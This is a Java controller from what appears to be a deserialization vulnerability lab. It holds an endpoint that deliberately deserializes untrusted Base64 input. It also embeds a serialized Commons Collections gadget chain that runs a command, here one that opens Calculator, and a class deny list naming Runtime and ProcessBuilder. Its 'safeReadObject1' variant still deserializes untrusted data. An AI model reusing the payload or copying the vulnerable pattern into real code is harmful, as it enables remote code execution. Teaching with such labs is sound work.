package top.whgojp.modules.deserialize.readobject.controller;

import io.swagger.annotations.Api;
import io.swagger.annotations.ApiOperation;
import lombok.extern.slf4j.Slf4j;
import org.apache.commons.io.serialization.ValidatingObjectInputStream;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.*;
import top.whgojp.common.utils.R;
import top.whgojp.modules.sqli.entity.Sqli;

import java.io.ByteArrayInputStream;
import java.util.Base64;

/**
 * @description 反序列化 - ReadObject
 * @author: whgojp
 * @email: whgojp@foxmail.com
 * @Date: 2024/8/19 12:39
 */

@Slf4j
@Api(value = "ReadObjectController", tags = "反序列化 - ReadObject")
@Controller
@CrossOrigin(origins = "*")
@RequestMapping("/readObject")
public class ReadObjectController {
    @RequestMapping("")
    public String readObject(){
        return "vul/deserialize/readObject";
    }

    @RequestMapping("/vulReadObject")
    @ResponseBody
    public R vulReadObject(String payload) {
        System.setProperty("org.apache.commons.collections.enableUnsafeSerialization", "true");
        log.info("Java反序列化："+payload);
        try {
            payload = payload.replace(" ", "+");
            byte[] bytes = Base64.getDecoder().decode(payload);
            ByteArrayInputStream stream = new ByteArrayInputStream(bytes);
            java.io.ObjectInputStream in = new java.io.ObjectInputStream(stream);
            in.readObject();
            in.close();
            return R.ok("[+]Java反序列化：ObjectInputStream.readObject()");
        } catch (Exception e) {
            return R.error("[-]请输入正确的Payload！\n"+e.getMessage());
        }
    }
    @RequestMapping("/safeReadObject1")
    @ResponseBody
    public R safeReadObject1(String payload) {
        // 安全措施：禁用不安全的反序列化
        System.setProperty("org.apache.commons.collections.enableUnsafeSerialization", "false");
        log.info("Java反序列化："+payload);
        try {
            payload = payload.replace(" ", "+");
            byte[] bytes = Base64.getDecoder().decode(payload);
            ByteArrayInputStream stream = new ByteArrayInputStream(bytes);
            java.io.ObjectInputStream in = new java.io.ObjectInputStream(stream);
            in.readObject();
            in.close();
            return R.ok("[+]Java反序列化：ObjectInputStream.readObject()");
        } catch (Exception e) {
            return R.error("[-]请输入正确的Payload！\n"+e.getMessage());
        }
    }
    @RequestMapping("/safeReadObject2")
    @ResponseBody
    public R safeReadObject2(String payload) {
        log.info("Java反序列化："+payload);
        try {
            payload = payload.replace(" ", "+");
            byte[] bytes = Base64.getDecoder().decode(payload);
            ByteArrayInputStream stream = new ByteArrayInputStream(bytes);
            // 创建 ValidatingObjectInputStream 对象
            ValidatingObjectInputStream ois = new ValidatingObjectInputStream(stream);
            // 设置拒绝反序列化的类
            ois.reject(java.lang.Runtime.class);
            ois.reject(java.lang.ProcessBuilder.class);
            // 只允许反序列化Sqli类
            ois.accept(Sqli.class);
            ois.readObject();
            return R.ok("[+]Java反序列化：ObjectInputStream.readObject()");
        } catch (Exception e) {
            return R.error("[-]请输入正确的Payload！\n"+e.getMessage());
        }
    }

    /**
     * 反序列测试
     * @param args
     */
    public static void main(String[] args) {
        System.setProperty("org.apache.commons.collections.enableUnsafeSerialization", "true");
        String payload = "rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW5nLkV4Y2VwdGlvbtD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXVxjUnOXe4ywMABEwABWNhdXNldAAVTGphdmEvbGFuZy9UaHJvd2FibGU7TAANZGV0YWlsTWVzc2FnZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sACnN0YWNrVHJhY2V0AB5bTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDtMABRzdXBwcmVzc2VkRXhjZXB0aW9uc3QAEExqYXZhL3V0aWwvTGlzdDt4cHEAfgAIcHVyAB5bTGphdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudDsCRio8PP0iOQIAAHhwAAAAA3NyABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRhCcWaJjbdhQIABEkACmxpbmVOdW1iZXJMAA5kZWNsYXJpbmdDbGFzc3EAfgAFTAAIZmlsZU5hbWVxAH4ABUwACm1ldGhvZE5hbWVxAH4ABXhwAAAAUXQAJnlzb3NlcmlhbC5wYXlsb2Fkcy5Db21tb25zQ29sbGVjdGlvbnM1dAAYQ29tbW9uc0NvbGxlY3Rpb25zNS5qYXZhdAAJZ2V0T2JqZWN0c3EAfgALAAAAM3EAfgANcQB+AA5xAH4AD3NxAH4ACwAAACJ0ABl5c29zZXJpYWwuR2VuZXJhdGVQYXlsb2FkdAAUR2VuZXJhdGVQYXlsb2FkLmphdmF0AARtYWluc3IAJmphdmEudXRpbC5Db2xsZWN0aW9ucyRVbm1vZGlmaWFibGVMaXN0/A8lMbXsjhACAAFMAARsaXN0cQB+AAd4cgAsamF2YS51dGlsLkNvbGxlY3Rpb25zJFVubW9kaWZpYWJsZUNvbGxlY3Rpb24ZQgCAy173HgIAAUwAAWN0ABZMamF2YS91dGlsL0NvbGxlY3Rpb247eHBzcgATamF2YS51dGlsLkFycmF5TGlzdHiB0h2Zx2GdAwABSQAEc2l6ZXhwAAAAAHcEAAAAAHhxAH4AGnhzcgA0b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmtleXZhbHVlLlRpZWRNYXBFbnRyeYqt0ps5wR/bAgACTAADa2V5cQB+AAFMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAF4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWVxAH4ABVsAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHQACWdldE1ldGhvZHVxAH4AMgAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+ADJzcQB+ACt1cQB+AC8AAAACcHVxAH4ALwAAAAB0AAZpbnZva2V1cQB+ADIAAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAvc3EAfgArdXIAE1tMamF2YS5sYW5nLlN0cmluZzut0lbn6R17RwIAAHhwAAAAAXQAEm9wZW4gLWEgQ2FsY3VsYXRvcnQABGV4ZWN1cQB+ADIAAAABcQB+ADdzcQB+ACdzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAAeHg=";
        try {
            payload = payload.replace(" ", "+");
            byte[] bytes = Base64.getDecoder().decode(payload);
            // 将字节转为输入流
            ByteArrayInputStream stream = new ByteArrayInputStream(bytes);
            // 反序列化流，将序列化的原始数据恢复为对象
            java.io.ObjectInputStream in = new java.io.ObjectInputStream(stream);
            in.readObject();
            in.close();
            log.info("反序列化漏洞");
        } catch (Exception e) {
            log.info(e.getMessage());
        }
    }

}
